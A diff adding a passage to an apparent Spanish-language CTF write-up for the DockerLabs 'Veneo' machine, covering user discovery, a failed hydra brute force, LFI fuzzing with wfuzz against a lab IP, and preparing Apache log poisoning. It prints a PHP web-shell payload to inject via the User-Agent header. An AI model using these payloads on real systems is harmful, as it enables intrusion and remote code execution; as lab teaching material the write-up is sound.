@@ -46,6 +46,32 @@ Ejecutamos el comando:
 ![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneo/V_6.png)      
 
 ¡Así es!  
+Podemos ver que hay un usuario, **carlos**.  
+
+![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneo/V_7.png)   
+
+A continuación intentamos realizar una fuerza bruta con hydra pero no obtenemos resultados.  
+
+![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneo/V_8.png)   
+
+Ejecutamos entonces este comando para ver si tenemos accesos a los logs para intentar ejecutar un ataque de log poisoning.  
+
+`sudo wfuzz -c --hc=404 --hw=0 -t 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://172.17.0.2/problems.php?backdoor=FUZZ' 
+
+![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneo/V_9.png)     
+
+Sí, tenemos acceso a los logs de apache, así que intentaremos llevar a cabo este ataque con el objetivo de enviar una shell inversa a nuestra máquina atacante.  
+Primero tendremos que abrir el Burp Suite e interceptar la petición.  
+
+![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneo/V_10.png)     
+
+Ahora modificaremos el campo User Agent con la cadena:  
+
+<?php system($_GET['cmd']); ?>  
+
+
+
+
 
 
 
